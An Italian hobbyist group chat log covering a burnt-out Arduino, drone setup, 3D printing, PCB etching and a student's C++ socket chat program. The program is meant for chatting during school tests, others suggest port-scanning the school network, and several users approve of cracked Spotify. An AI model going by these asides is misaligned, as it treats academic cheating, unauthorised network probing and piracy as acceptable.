Un paio di riavvii e poi a frequenza di luce strobo si è messo a cortocircuitare l'alimentatore, per un attimo parte e poi manda in corto l'alimentatore, ri parte e manda di nuovo in corto l'ali... Tutto a velocità a prova di discoteca
si ho letto sull'altro gruppo..e adesso come fai?
Che faccio? Butto l'Arduino
Cerco di capire perché dava questo problema e ce ne piazzo un'altro
Il motivo per cui in questo periodo sono lento a rilasciare build di Switchando
Io sto andando avanti, ma ogni nuova classe/interfaccia/enumeratore/classe astratta/oggetto che devo creare ci sto mezz'ora per decidere come chiamarlo
aveva ragione quell'altro ragazzo, ti conviene usare uno zoccolo per montarci su Arduino, altrimenti ti tocca dissaldare ogni volta
Ma voglio capire come si è rotto prima...
alimentalo e controlla i pin con il tester
Scalda e puzza
Poi non posso alimentarlo
Mi distrugge l'alimentatore
Non voglio nemmeno provare ad attaccarlo al PC
Probabilmente mi andrebbe in protezione l'alimentatore rischiando di rippare CPU, scheda madre e RAM... (forse la RAM no perché non va a 5V)
🤔 mi sa tanto che si è fritto lo stabilizzatore di tensione
Che poi non so nemmeno se è un corto veramente o è l'alimentatore che va in protezione perché bruciando qualche componente assorbe troppo
Uh ora che ci penso quell'Arduino è un USB Killer con il funzionamento opposto
🤔 boh, si dovrebbe controllare il circuito con il tester..hai provato ad alimentare solamente arduino, scollegato dal circuito mosfet?
Not yet
non avevi resettato la memoria?
?
non avevi cambiato lo sketch caricato sulla memoria? se hai fatto qualche esperimento prima del circuito led potrebbe anche essere quello il problema, cioè dei valori sballati
Non sto capendo
Qualcuno di voi ha il DigiSpark?
Yep
Come ti trovi? Lo hai configurato da Linux?
Hai installato i driver?
Mi sa che c'è qualche problema con il layout della tastiera, l'ho programmato su lubuntu. Appena l'ho messo su windows ha iniziato a fare cose a caso e mi sono ritrovato il maiusc attivo senza poterlo disattivare e i link di google che si aprivano in una nuova finestra
Devo trovare un modo di testarlo senza fare casini
Live USB
Dovrei mettere un keylogger per capire cosa fa realmente
Ma hai messo i driver per poter visualizzare la com Vero?
Lo devo testare su win
Certo che li ho messi, come potrebbe funzionare altrimenti?
Eh, ma su Linux?
Link git?
A me Arduino lo vede senza
Non ho capito il problema
Devo mettere i driver su Linux
Quindi serve il link da aggiungere ad Arduino
Per poi trovare la scheda dove posso caricare il codice
Ah, sul sito della digispark, si chiama digistump, mi sembra.
Grazie
HAHAHAHAAHAHAHAHAHAHAAHAHAHAHAHAAHHQHAHAHAHAAHHAHAAHAYAH
92 minuti di applausi 

Raga ci sono bitcoin a 8€ 
Subito, poi fai dal commercialista e diventi ricco, altro che imprenditori qua
sattoh ù.ù
proprio l'impianto?
Ma è inutile
dillo a 
 che l'ha seriamente preso hahahaah
Di dove sei che usi quest' espressione ?



 qui ci vuole un tutoriallllll per ki nn vuole partizzzzzionare lard disc


Ma che cagata è ?
Si brucia la MB
Tantissimo
 ma la macchina poi cosa aveva?
Procurati questo con l'App Torque.
Filtro del diesel mi pare.... Diesel non artico venduto contro la legge dal distributore
Maledetti infami...
Già... Il distributore di Ravina
Filtro del diesel da cambiare causa gasolio non invernale
Uuuh ugual a quel che ho detto io 
Non invernale... L'artico fa -20°C e lo espongono come opzionale (e più caro), l'invernale - 10°C è obbligatorio

Mmm si dai artico, invernale, siamo li
Roba che non congela pezzi
Cosa ho vinto? Ahahah
Classico insomma...
Va beh quanto ti ha spennato?
Duecento mi pare
A son venetooo
Ok, ho gogolato, è un espressione medievale diffusa in tutta Italia, abito a 5 km da Aramengo, dove è nata!!!
Ci sono un sacco di criptovalute
Du' piotte
per cambiare una filtro?
A quanto pare 
Troppo?
dipende quanto era difficile arrivarci, quasi quasi avrei provato a cambiarlo da solo
comunque di solito il cambio di filtro olio aria piu olio e carburante sta sui 250
This ROBOT Solves the Rubik's Cube - YouTube

Bello
decisamente si..il cambio del filtro gasolio nelle Hyundai di solito viene 80+manodopera
Beh appunto, 120 manodopera
Considera che in Trentino tutti questi lavori costano il doppio
è carissimo..120€ di manodopera se li prendono se ti devono smontare mezzo motore..mica hanno lavorato 4 ore per smontare un filtro 
il quadruplo direi 
No beh metti 80+20
Per 2
perchè per due? il filtro uno solo è🤔
Ma costa il doppio
Per principio
ah ecco, raddoppiano in automatico
Scusate una domanda....

Come lo devo impostare per caricare una zippy 3000mah 4celle?
cosi va bene. carica lenta e salutare. Fino a 3A ci puoi arrivare tranquillamente comunque
Grazie mille....più o meno quanto tempo ci vorrà?
Se la stacco prima succede qualcosa?
1 ora se la carichi a 3A..  no.
Il valore in basso a sinistra per cosa sta?
Grazie mille
quanti mah che hai caricato.

Nuova icona di WhatsApp? 
hanno aggiunto un cerchio verde intorno
"Wazzapp è mellio"
Eh si
devo stampare un pezzo in 3d mansiccome è troppo grande per l'area di stampa pensavo di dividerlo, secondo voi è necessario fare una sorta di guida magari a incastro con un pezzo che entra nell'altro o basta un po' di attak
il modello è la riproduzione di una moto e sarà ferma e non subirà sollecitazioni
Con quanto infill stampi?
sul 20/25%
magari metto i lati piu spessi
dipende dal pezzo e da quanto pesa..se fai 2-3 incastri è sicuramente più saldo
Metti lo spessore delle pareti abbastanza alto e poi un po' di attack basta
ok grazie
Figurati
No è fiko
Qui da noi (Emilia) non trovi nessuno che lavora per 30€ l'ora... Sei sui 60
Basterebbe ma con qualche incastro è più facile allineare i vari pezzi
al massimo se no ci faccio in entrambi il negativo di un buco poi una volta stampati uso un perno
cosaaaaaaaaaaaaaaa??? e che hanno, le mani d'oro?
Sì facci due pin o quel che vuoi, vedrai che poi è più semplice fare un lavoro pulito
Ah oh i prezzi delle officine autorizzate sono questi.
Se poi vai da ammiocuggino magari trovi anche chi lavora a meno ma sai poi come funziona...
boh ragazzi, sarò abituato troppo bene io, ma da me a Reggio anche le officine ufficiali oltre 30-40€ / ora non vanno come manodopera

 ‎€3‎8.‎24‎ i‎nv‎ec‎e ‎ch‎e ‎€4‎4.‎99
⚖️‎ R‎is‎pa‎rm‎i ‎il‎ 1‎5.‎00%
⭐️‎ 5‎.0‎0 ‌‎/‌‎ ‎5.‎00‎ (‎5 ‎re‎ce‎ns‎io‎ni)
 

Che sarebbe sto robo?
Uno slider
mi sembra ovvio ù-ù
uno slider per la fotocamera..si usa per fare le riprese in progressione orizzontale
Okay

hey gente, qua c'è qualche audiofilo espertologo? perchè c'ho dei dubbi esistenziali su un paio di cose, del tipo, se io collego i pin di una scheda che un tempo era una cassa bluetooth e gli trasmetto un qualsiasi suono, anche fisso, perchè esce segnale sempre diverso? non dovrebbe avere lo stesso valore di voltaggio se è la stessa cosa? e poi anche quando non invio suoni mi dice che c'è un certo voltaggio in uscita da quei pin, non sto capendo, perchè sono sicuro che non siano i contatti il problema quindi boh
Non ho capito
asp
Le onde cambiano
Se io li collego all'arduino dall'analogico mi registra valori sempre e comunque diversi, sia se non sto trasmettendo nulla che se sto trasmettendo un segnale fisso
Dafuq, perchè proprio Kali tra le tante altre Distro Linux possibili?
Ma che output hai preso?
aappunto, credo di sbagliare qualcosa li, come dovrei fare?
io ho connesso positivo a pin analogico e negativo a gnd
Ubuntu è già supportato, e mi sembra anche Fedora
Se ti serve un output dell'audio devi collegarlo in parallelo alle casse
Dove hai collegato ora non so cosa sia
no io lo connetto ad un arduino, volevo provare a ricevere il segnale così
pensavo....come dovrei connetterli a sto punto, positivo-analogico-resistenza-gnd tipo?
No dico sulla scheda dell'amplificatore
tipo connetto positivo ad analogico e sempre li gnd separato da una resistenza?
Che segnale devi prendere?
ah beh li c'è un preamplificatore da poveri ed è una cassa bluetooth poi non so come sia fatto su
il segnale di voltaggio che esce normalmente dall'amplificatore che deve raggiungere la cassa
Coooomunque non puoi collegarlo direttamente ad Arduino
Il segnale non raggiunge neanche 1V nella maggior parte dei casi
why?
Hai bisogno di un opamp
cos, dal mio telefono escono 3v e non si sente quasi nulla, se uso la scheda con il preamplificatore li si sente e non poco, per me sono almeno 5-6v
Non credo
Se sono 6 non puoi usarlo comunque
a wait....ora che ci penso...basta fare un calcolo veloce, 1053=3.3v sull'arduino in questo caso, se non sbaglio, da li mi escono valori con picchi a 450...allora si, è abbastanza basso dai, tra 1 e 2v
però non ho problemi su quello, a me basta vedere il voltaggio che ci passa, come faccio a chiudere il circuito nel modo giusto per avere quel pin analogico in read che funzioni🤔
Per quel che ho notato le casse non hanno polarità, come le colleghi colleghi vanno
Ma forse sarebbe meglio provare con un multimetro
fooorse ho un'idea, l'altro giorno al tandem ora che ci penso abbiamo fatto qualcosa di simile....potrei provare, tipo corto circuito mancato grazie ad una resistenza attaccata al gnd, credo che funzionerebbe...
in realtà hanno polarità, collegando in un modo la membrana si sposta verso l'alto e all'altro modo va verso il basso, se tu hai due casse che trasmettono lo stesso suono con polarità inverse tu non senti nulla perchè i suoni si annullano a vicenda
ma con il multimetro funziona
E si ma per vedere chi devi collegare a cosa
Se colleghi gnd al vcc sei finito

beh ma è uguale, esce comunque lo stesso voltaggio
Si ma ci sta il - davanti
noo, l'altro giorno con l'nxp me l'hanno fatto fare hanno delle resistenze interne per evitare questi """""imprevisti""""" però effettivamente è il minimo per una scheda da 90 euro
Hai l'originale?
eee ci starebbe ma dal pin mi legge comunque con il +
nxp lpc 1768
yeep
Lascia stare tutto, fuggi
Si distrugge!
mahonna, la prossima volta che è l'ultima me la intasco e me ne vado
Costa troppo per fare esperimenti 
ma non la bruci manco se vuoi
E ci puoi fare questo...voglio dire...c'è...c'è...c'è
Che sorta di scheda è mai quella
nxp lpc1768
 this
Non mi ispira molto
Quanto costa?
sui 90 euro, comunque costa meno sul sito ufficiale, sta sui 50/60
e non ne esistono cloni
a e ha un 
 la amo
Ah
Però tutti sti soldi mi triggerano
Mi sapete dire perché fa così?
È l'antifurto
Hai componenti rubati

Devi comprarli da Amazon e non dai cinesi
Fate i seri
Perfavore
Perché devi abbinarlo al controller credo
Di solito gli esc fanno così finché non si abbinano
Sai come si fa?
Che controller usi?
Fs-i6s
Sei riuscito a collegarlo al drone ?
Alla x2 della naza
La Naza è montata?
Si
Aspè devi fare il collegamento tra ricevente e telecomando
Se spegni il drone si sconnette, devi collegarlo ogni volta
Non l'ho mai fatto partire
Sai come si fa?
Help
Allora
Qualcuno ha fatto la rubber?
Non ricordo bene ma nella confezione c'è sicuramente un cavetto nero che collega i 2 estremi
Nella ricevente
Che significa i due estremi?
Hai presente i pin dove colleghi i servo/esc
Si
Così faccio prima
Grazie
Mi sa che non era questo il problema 
Ma no ovvio, quel suono sono gli ESC arrabbiati
Ah allora Sorry
O li stai alimentando male, o non hanno una naza con cui parlare o hanno qualsiasi altro tipo di problema
Dovresti guardare se è spiegato nelle istruzioni degli esc
Comunque il telecomando non è sicuramente un problema loro: loro in linea di massima fanno semplicemente quello che gli dice la naza
Sì infatti il problema sono gli esc
Ma in questo modo non mi fa connettere neppure la naza al pc
Ho seguito passo passo i tuoi video per il montaggio non dovrei aver sbagliato nulla
Però non so perché faccia così
Non viene rilevata?
Ora si
E non fa più i bip

Ora fa così a manetta
Appena staccata dal PC con i valori messi
Solo luci rosse?
Ma che flight controller hai?
Naza lite
Grazie 
, ti cancello i messaggi solo perché hanno ref concorrenti 
Di niente tranquillo
Grazie mille
Qualcuno sa dirmi perchè non entra nella directory della sd
Mi sento dio, sono riuscito ad usare i socket
Naza m lite
C++?
yeeep
Ma è un suicidio
muhahahaha, funziona, dopo 2 ore e mezza di errori ora vaaaaaa
In python si va di 
Ci avevo provato, proprio un dito nel culo l'uso dei soket in c++
hehehe
beh, questo ed altro per fare una chat in cpp e chattare a scuola con i pc in lan durante le verifiche di informatica
In python è molto piu comodo e facile
già
Descrivi meglio cosa succede
Occhio, ci sono le porte bloccate e quindi devi fare uno scan port per vedere cosa puoi usare
giàà fatto...dovrei averlo da qualche parte nel vecchio hdd, comunque ricordo che c'erano un casino di porte aperte e credo inutilizzate anche
Da me in uni le porte aperte sono una decina xD
comunque dai, non è difficilissimo in cpp, ci sono i comandi che sono un dito nel culo si ma con visual studio che ti finisce la frase tu spari a caso il possibile comando e lui te lo completa praticamente
fac, ho solo un'altra mezz'ora di tempo, presto lo devo finire
emmhh...non capisco perchè non mi lasci usare cout e cin con un qualcosa di tipo stringa....come posso fare?
mi da errore su "cout" e su "»" dicendomi che l'operatore è invalido, io vorrei usare string però, non char
non è che le > sono girate?
nono, non è quello, con char e altri funziona, ma io voglio usare string cosicchè non abbia un limite di lunghezza come su un array di char, e poi neanche con il cast funziona..nel senso, mi lascia caricare e poi il messaggio sono simboli indecifrabili
strano, molto molto strano
ma la stringa la butti in una variabile?
E boh
hai  messo all'inizio 
 ?
yep
e allora 
 deve esistere visto che esiste la libreria iostream
con char e altri mi va...non mi è mai successo in realtà, è la prima volta
Voto?
io lo aprirei
È una scarpiera rotta 
si no ma c'è, con int, char e altri funzica, è solo con string....
molto molto molto strano...
a...stavo pensando, e se usassi vector? posso ricevere tutto il messaggio su un vettore char? sto cercando soluzioni per evitare di avere un limite di lunghezza in ricezione, in trasmissione non c'è problema...ora provo
se non vuoi avere una lunghezza massima usa variabili dinamiche (array di lunghezza variabile di char, a fine stream inserisce il null terminator)
ok non va comunque
ci ho appena provato, stessa cosa che con string ._.
la lib vector non la ho mai utilizzata
credo sia un qualche bug....
esatto, solo che lo fai manualmente. Comunque il problema non è la variabile, ma il cout
già
altri tipi di output tipo printf? (come si fa non li ho mai usati?)
cout per outout su console o usare output su file
anche, ora provo un paio di cosuccie
SEE CON PRINTF FUNZICAAA
che schifo
ti capisco
compilatore piu semplice possibile per c++?
windows obv
obv un par de cazzi
programmare su windows è un incubo
per C/C++ sei obbligato ad installare quel mattone di visual studio o prendere emulatori di linux
che palle
ricordo un ide che funzionava da dio
ma non  lo trovo piu
vai su linux a programmare... o usi wsl su win10 che  è uguale
si ora installo linux per fare un programma da 20 righe
dev-c++? è vecchio e pieno di problemi, ripiega in ambito linux che è meglio
ci metto piu tempo a installarlo che a fare un programma
alleluia,grazie
dev cpp metti se devi fare poco niente

mi va benissimo con tutti i problemi che ha
non è vero, in pochi minuti wsl è installato e funzionante
no grazie
dev c++ è un obrobrio, è lento, non aggiornato, buggato, non riceve aggiornamenti da un decennio circa
io soffro, perchè per funzionare funziona ma i dati gli arrivano tutti sfatti ._.
e lo usiamo noi a scuola
ma se devo fare programmi a linea di comando e che sfruttano al massimo la fork,che mi frega?
ma andate su linux che è molto piu comodo e veloce!
non ci devo programmare un gioco
ma dove
devo scaricare un iso e installarla
se non lo dici è perché non hai mai provato
l ho sempre avuto,mi rallenta solo il boot
wls!!!! non devi scaricare nessuna iso, basta cercare ubuntu sullo store di win
mai avuto problemi se non dovuti a cazzate che ho fatto con i permessi di root
aspetta
forse intendiamo cose diverse
wsl: windows subsystem for linux
ah ok
in pratica usi la console di linux perfettamente funzionante su windows senza usare emulatori o VM
quindi si ha la stessa potenza computazionale di avere linux istallato direttamente perché non ci sono programmi di mezzo che rallentano
si ho capito cosa intendi
l ho visto utilizzare dalla professoressa
è la cosa migliore che si possa usare per programmare su win10
SIII
Crea un server esterno
Che stia sempre attivo
raspberry pi
per ora però stavo pensando a come fare per farla tipo chat...se io devo coordinare i send e recv, come faccio a fare che tipo quando uno vuole scrive....non so come fare🤔🤔🤔
Io oggi ho iniziato a seguire il corso di reti del secondo anno anche se io sono al primo e il corso è cominciato da 3 settimane
E poi vedo "OPENCV" nel Path
Ah, l'ordine
si perchè non avevo voglia di cambiare cartella, io visual studio lo uso principalmente per quello
Ciclo infinito che attende un input da rete e/o da tastiera
mhh.....quindi nel server metto il ciclo infinito, e nel client....non so come fare a fare più di un client però
Lavora peer to peer
so cosa vuol dire ma già ho sofferto per fare questo, soffrirò vero?
Nah, è come raddoppiare chient e server
mmhh...forse ho capito, faccio in un while(true) un cin per client e send() al server, nel server metto il blocco finale in un for(int i=0;i<numero_client;i++) e poi faccio una cosa tipo recv() sempre che fa uscire poi a tutti gli altri client il messaggio...ora provo a fare una cosa del genere, maaa, sarebbe forse un problema il fatto del "input in while(true)" e l'arrivo di un messaggio...mmhh....beh, al massimo si usano i thread, ora provo
Devi lavorare con 2 thread: uno per il client e uno per il server cosí che l'input non blocchi tutto il sistema
mmhh...ok, ora lo faccio
Oppure lavorare in asincrono, ma in c++ ti complichi la vita mi sa, non ho mai provato
no ma con thread viene anche meglio, aumenti la velocità anche della cosa perchè lavora in parallelo...però effettivamente sui pc che ho a scuola mi sa che non funzionerebbe, un po' perchè quando ho chiesto alla prof "quando li facciamo i thread" mi ha guardato e ha riso dicendo "non sopravvalutare le cpu di queste pc" e un po' per istinto
Lavorare su piu thread lo puoi fare anche su un pentium 4 di piu di 10 anni fa, la cpu non è un problema. Lavorare in asincrono è comodo quando non si vogliono usare thread per gestire processi paralleli
Ma sono fittizi
E anche il terzo è pronto
Comunque, fork e thread dipendono molto dall'os, poi non ho capito cosa dovete fare 
Bravooj
SIIII BRAVOOOO
Cazzo anche a me
Più bravo di 

lol
IO STO AL 5
Ma stai fermo

Più o meno
Non ho abbastanza soldi per comprarli tutti ❤️
Lavori in corso
Neanch'io quando leggevo, poi ho rubato il bonus cultura a mio fratello 
Cosa è fittizio?
HAI UN FRATELLO?
Yup
se non si usano i thread implementati a livello hw alla fine li hai, ma sono solo a livello sw e quindi non noti miglioramenti
Queste rivelazioni
I thread in ambito di programmi e quelli quando si parla di cpu, hanno significati "diversi"
dipende come li intendi, io faccio solo la distinzione tra quelli a livello hw che sono visibili al kernel che li gestisce per mandarli in parallelo e quelli a livello software che non hanno gli stessi vantaggi perché è tutto simulato da una libreria 
Il kernel è software, come pure la tecnologia che riesce a far lavorare in parallelo 2 processi per ogni core. I thread dei programmi sono processi "figli" del processo madre che li ha creati in modo da poter eseguire piu funzioni in parallelo, e questi processi figli non sono simulati da nessuna libreria. Quindi quando parli di un programma, i thread sono i processi figli creati da un programma, quando si parla di cpu, i thread sono il numero di processi che il processore riesce ad eseguire in contemporanea. 
Ti ho chiarito le idee?
Somiglia un po' al mio prof di analisi 2

Pcb fatte in casa?
sono simulati nel senso che i thread implementati a livello software non sono visibili al kernel che gestisce tutto come un unico processo senza quindi andare ad ottimizzare il consumo delle risorse, quelli implementati a livello hardware invece possono essere gestiti dal kernel che magari li distribuisce su core diversi, quello intendevo 
Raga... Come potrei fare per calcolare i gradi di un semicerchio? Non trovo una formula
I thread sono processi, punto. I core sono elaboratori fisici. Non per nulla hanno nomi diversi
Gradi su un semicerchio? Cosa intendi?
stiamo parlando di due cose diverse
ok, scherzavo, non ci riesco, lo stesso "
 <thread>" fa smettere di funzionare il tutto ._.
Lo so, ma i thread hardware non esistono visto che sono creati e gestiti dal software
Devo aggiungere un comando in fase di compilazione
Yes
no ma i thread hanno sempre funzionato, non capisco
è per fare una distinzione tra quale software li gestisce 
Devo dividere in gradi lo spostamento di questo scara... Ma non avendo manuali ne niente non so a quanti gradi equivale il finecorsa iniziale a quello finale
Hai problemi con il compilatore... Sicuro di star usando un compilatore per c++? È aggiornato?
Un semicerchio sono 180 gradi, la metà saranno novanta, un terzo di novanta trenta, e così via... Non c'è altro modo, se ho capito quel che ti serve
uso visual studio, il compilatore dovrebbe essere tipo per c++11
I thread generati dai programmi vengono eseguiti nell'area utente, che viene gestita dal kernel
io faccio distinzione tra user thread e kernel thread 
Se anche voi usavate 
 craccato adesso che è scattato il ban mondiale sarete probabilmente rimasti senza musica... quindi è un'ottima occasione per provare 
 l'alternativa di Amazon a Spotify

Si chiama 
 e... dateci un'occhiata, tanto è gratis 



ban mondiale?
Allora non ci dovrebbero essere provlemi
lol
questo, 
FINALLY
Occhio che con quel metodo si corrode in modo ultra veloce
ma li vede come un singolo processo
ce l'anno fatta a capire che la gente cheattava
toh, se qualcuno vuole dargli un'occhiata e dirmi cosa sbaglio, ho lasciato tutto ciò che non andava commentato così ora va ma solo per 1 client e 1 messaggio da solo il server
Non proprio un semicerchio preciso di 180 °
e sì sono contento che siano riusciti a bloccare le crack
quando la gente abbandona torrent perché la legalità la chiama, ma poi odia la pubblicità e cracca tutto
Allora prendi un goniometro e misura 
Cioè non capisco quale sia lo scopo
però insieme alle crack gli è morto pure il sito
basta che apriate una porta del router, io ho usato la 1111, che punti sul vostro ip locale.
Scusa un attimo, spiegami cosa intendi tu con kernel thread
Un goniometro di 2.5 metri hahahah
io torno tra una quarantina di minuti
Eh vabbè mica cambiano gli angoli
Nah, sempre fatto così fin dalla scuola.
Ovvio che se usi la 130 volumi senza acqua... Ma con la 12 o 130+acqua zero problemi
Ma neanche morto, forse sulle cpu con un solo core è cosí
e poi c'è la gente intelligente che si degna di dare una ricompensa agli artisti
Ne prendi uno piccolo e prolunghi con una corda
Il problema è che non sarei preciso come dovrebbe essere nell'equazione dopo
Usi il fotoresist? O il toner
Dove si trova l'acido?
Qualsiasi supermercato
Dal ferramenta o al supermercato
Yes, "bromografo"
Ah
Se lo bolli lo rendi più concentrato
Io volevo farlo con il toner, ma non ho una stampante laser
Cosa cambia con una normale? Non si attacca?
Una volta io andavo a fare le fotocopie nelle edicole
Il toner se riscaldato si stacca dalla carta e si attacca al rame
Con il toner transfer non ho mai ottenuto risultati soddisfacenti (se non comprando le pellicole pnp, ma così mi giocavo la convenienza di farli in casa)
A me venivano perfette anche con la piastra ...poi sono passato al fotoresist(costoso)...ora voglio passare alla penna con stampante 3d...per risparmiare
Sennò cnc e vai sempre 

Grazie della live, veramente simpatica, quasi la faccia in treno alla riapertura del canale immagino 

- attento alle lampade led dimmerabili su banggood, di dimmerabile c'è solo la scritta.
- non avrei mai pensato che potessi dimmerare con un potenziometro, anche se le correnti in gioco sono basse a fine corsa trimmer hai una ddp di quasi 230 Vac che moltiplicata per la corrente fa comunque qualche watt di dissipazione e lo slider non regge( come li ho visti ho pensato....fumeranno.
- peccato che nella Live non hai detto 
 neanche una volta
In pratica quello che dicevo io, solo che con altre parole
Eh 
Ragazzuoli ho bisogno di mettere più Arduino sparsi per casa, solo che posso collegarli alla 200v e non vorrei fare un impianto 5v apposta. Tutto ciò per chiedere, quale è il modo più semplice e compatto per alimentarli, dato che dovrebbero stare a muro?
Batteria, ma hai il problema che si scaricano, altrimenti alimentatore in miniatura
Numero di trasformatori pari al numero di Arduini
E ovviamente stesso numero di prese
Alimentatori in miniatura. 
Per fare una linea a 12 v separata dovresti utilizzare altre tubazioni.
Per normativa non puoi mischiare cavi 12v e 230v
Anche se i cavi per impianti antifurto hanno specifiche tali da poter passare misti ai cavi 230v
Se anche voi usavate 
 craccato adesso che è scattato il ban mondiale sarete probabilmente rimasti senza musica... quindi è un'ottima occasione per provare 
 l'alternativa di Amazon a Spotify

Si chiama 
 e... dateci un'occhiata, tanto è gratis 



coooosaaa?
rip
Porco.....
Come cazzo faremo
Prima deezloader 
Ora Spotify craccato
The end is near
ma perchè la povera gente non può ascoltare la musica?
vabbè... tanto io ho già scaricato le canzoni da spotify
Vogliono i soldi loro
Ecco cosa vogliono
Ho comprato un dimmer Finder studiato appositamente ler lampade led, ma devo ancora testarlo
Beh 11€ un fornetto da unghie, le basette con o senza photoresist c'è poca differenza di prezzo.
CNC/stampante 3d con penna l'ho scartata, le piste sottili te le scordi (oltre a metterci una vita)
Le piste sottili le riesci a fare
Bisogna usare punte moolto piccole
ci sono convertitori 230-5v moolto piccoli, prova a guardare in giro
magari compri un alimentatore, lo apri e prendi solo la pcb, visto che stanno a muro
Boh PCB fresati con piste sottili precise non ne ho ancora visti, se hai qualche esempio son più che contento di ricredermi
Detto ciò personalmente non vedo vantaggi nel fresarli:
-costi più elevati
-tempo necessario maggiore
-polvere
-rumore
Se vi interessa sul playstore ci sono app in sconto ed alcune messe gratis.


Il costo non troppo, una volta che hai preso la macchina non hai problemi
Polvere e rumore si
si
asp
AIUTO
sta caricando video
Perchè non gira la ventola davanti?
se stampi abs non ti serve nessuna delle 2 ventole e poi non gira perchè non hai attaccato il pin bene, quella gira sempre e comunque appena gli arriva alimentazione
il pin è attaccato bene sto stampando pla
dovevo mettere qualcosa in particolare su cura?
noh, dovrebbe andare
se è attaccato bene allora c'è qualche problema
I primi strati non gira la ventola ma è normale
ah ok
La ventola serve per raffreddare la plastica già stampata
È la i3?
Esistono delle prese usb ovvero alimentatori a 5 volt entrocontenuti ai frutti delle serie civili
Raga ci sono cardiologi/Dottori qua in mezzo ?
ha incominciato a girare adesso
grz 
 e 
No mi dispiace
RIP
Se è urgentissimo posso chiedere a mio padre
 dove posso vedere il tempo rimanente di una stampa in corso?
sto stampando il classico coso per tenere i due mosfet
premi un paio di volte il bottone in giù e esce, almeno, a me, a te non so
asp
in genere se stampi da pc ti dice anche i secondi proprio, sulla stampante con alcune c'è con altre no
conviene comprare l'A8 ad oggi?
siii
ovvio
130€
yeep
Spesi bene?
già
Vabbè ci penso
Tanto la mia regione mi da 400€ per materiale didattico
Perché sono un bravo studente
E la stampante è materiale didattico
È c++ 98...
borsa di studio
Y
Ma porco
Io uscito con la lode alle medie 100€...
noh, io non uso quellammerda di dev cpp
ma da tanto anche
io pureee, ma non mi hanno pagato
Bro hai impostato path per il compilatore una volta installato vs?
Non sei uscito con la lode 
sisi, ma va sempre e comunque


Se hai impostato la path stai usando quello già installato, ovvero il 98 installato con dev
noh, ho installato con l'installer mingw e cazzi e mazzi, infatti è una rottura sapere che i codici che in genere scrivo con visual studio poi non vanno su dev cpp
DeV CiPiUPiU
e non era quello il problema, ho scoperto che iostream di c++11 non include l'esistenza delle stringhe tipo...e quindi bisogna per forza includere string e vector per quel che facevo io
Mi sembra poco probabile 🧐
cerca su speckoverflow
ma come... io quando uso c++11 con i thread non ho problemi
ma boh, è anche la prima volta che mi succedeva, mi sembra strano ma includendo ha funzionato poi
che comunque le stringhe come tipo di dato per averle bisogna usare la libreria apposita
ViSuAl StUdIo
KlOsEd sOuRcE
comunque, per passare un tipo SOCKET in una funzione come cribbio faccio? facendo SOCKET valore mi da errori brutti ._.

con questo non ho mai avuto problemi (linux ovviamente)
Alla fine con mingw il comando è lo stesso
seeeeee, funzica, mi sento cristo, però si può solo fare uno alla volta..c'è, scrivi da uno e solo dopo puoi rispondere dall'altro
perchè non riesco a passare il socket nel thread e rendere tutto globale non è un'opzione
In Python si può implementare tranquillamente 🤷‍♂️
si, ma io a scuola studio il cpp e ho solo dei compilatori per il cpp
E installa l'interprete Python di nascosto
🤷‍♂️
 lo ho in chiavetta
quindi dovevo farlo con c++ e socket....è stata dura ma ce l'ho fatta...no dai, non è stata dura, quando impari le funzioni è facile
cerca di capire basandoti sugli esempi online e le reference del c++ come utilizzare bene i thread
si può compilare sui pc della scuola usandolo?
Si dice interpretare ma è quello e si
idem  vita da secchioni poveri ._.
python è mezzo compilato e mezzo interpretato
no ma per usarli come ho capito ma non capisco come passare i socket dentro....per il resto è facile farlo, basta mettere un listen() e un send() contemporanei in due cicli while(1)
Ma poi non ottieni un .exe (o almeno non ho idea di come si faccia) ma uno script da lanciare
k
quando crei i thread devi assegnarli una funzione. In quella funzione inserisci il codice che si occupa di inviare o ricevere
che poi...esattamente, i socket come sono definiti? c'è, ho capito cosa sono ma esattamente, con che tipo di variabile sono definiti? sono almeno definibili variabili? c'è...sono un po' un'altra cosa
Bravissimo, sempre meglio avere l'acqua santa con sè per convertire qualche infedele
si ma sono capace di usare i thread, il problema è come faccio a ficcare il socket dentro quella funzione? attraverso gli argomenti della funzione s'intende, non riesco a capire come non essendo una variabile normale
Si ma l'ho solo installato 
In python non vado oltre il for 
che triste
Preferisco il c++ in realtà
bravo
ti passo un codice che potrebbe aiutarti (non ci sono soket, ma thread si9
ma non mi serve
sono capace ad usare i thread ho detto
li uso pure spesso, non è quello il problema, è proprio come ci passo un socket?
Prendi i corsi di sololearn
e fosse un thread normale farei : 
thread nome(funzione(a));
void funzione(int a){...}
ma ora se dentro "funzione()" devo usare i socket, come glieli passo? c'è void(funzione(SOCKET nome_socket)); e thread nome(nomesocket); non va, mi da errori strani
questo è il problema
Prima finisco la holy bible di strousup, l'elettrotecnica, opencv, javascript, modellazione 3d e video editing con blender, fl studio e la chitarra, poi se sono ancora in vita passo al resto
emmhh...ok, si, io uso un'altra versione di thread probabilmente, questa è quella che funzica con c++98 tipo, io uso c++11 ed è diversa, questo modo non funziona con visual studio, comunque ho capito cosa intendi, ho detto, facendo (SOCKET nome) come se fosse un parametro mi da errore
io questa la uso con il comando che ho scritto sopra, quidni c++11
allora boh, a me da errore su visual studio usarlo così, devo usarlo nell'altro modo
🤷‍♂️
sempre detto che vs fa schifo
continua a darmi sempre e comunque questo : Severity  Code Description Project File Line Suppression State Error C2672 'std::invoke': no matching overloaded function found
 quando ci provo
e un altro errore
perché prova a fare l'overloading di una funzione? non ha senso...
manco so cosa sia io
sto dando un'occhiata su internet e più guardo e meno capisco, io non ho mai usato i thread e le funzioni nel modo in cui le usano su internet per farlo...
passa a linux e g++, fregatene degli ide e di vs in particolare
Due funzioni diverse con lo stesso nome
ma in genere, fare una funzione del tipo void* nomefunzione(void* valore){} cosa vogliono dire quei "*" io di norma li uso per i pointer...e ok, ma come si usano con le funzioni tipo?
int a(int b);
int a(char c);
int a();
void a(int b);

Overloading
capito
void* non esiste, non ha senso
Cos
tutti fanno così su internet....pure io me lo stavo chiedendo
void* è un puntatore generico
non era var* ?
In genere si usa poco in C++
nono void*
mmhh...e serve a?
Può tenere qualsiasi tipo di puntatore
ecco, allora ha senso nel mio caso, ora capisco
Ma in C++ ci sono 292736 tecniche per non usare void*
ma continua ad uscirmi quell'errore
si ok ma come faccio a passare negli argomenti un qualcosa di tipo SOCKET? facendo SOCKET nome mi da sempre lo stesso errore...io boh
*gif veggente che scruta nella sfera di cristallo*
per capirsi: ho fatto un corso con relativo esame di programmazione 1 in c++ all'uni e void* non ci sono stati nemmeno spiegati da quanto evitabili sono (immagino)
Cosa sarebbe SOCKET?
